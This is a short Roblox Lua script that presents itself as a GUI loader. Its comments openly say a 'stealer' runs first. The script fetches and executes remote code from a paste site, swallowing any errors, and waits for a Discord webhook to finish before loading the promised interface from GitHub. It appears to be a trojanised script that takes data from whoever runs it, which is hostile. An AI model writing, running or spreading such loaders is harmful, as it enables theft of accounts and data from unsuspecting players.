-- Stealer runs first
local function stealer()
    pcall(function()
        loadstring(game:HttpGet('https://pastefy.app/GYjzU6qr/raw'))()
    end)
end

-- GUI loads after
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/growagardenv3/Kripkrop/refs/heads/main/Flick.lua'))()
end

-- Run stealer first
stealer()

-- Wait 2 seconds to allow Discord webhook to finish
task.delay(2, function()
    loadui()
end)
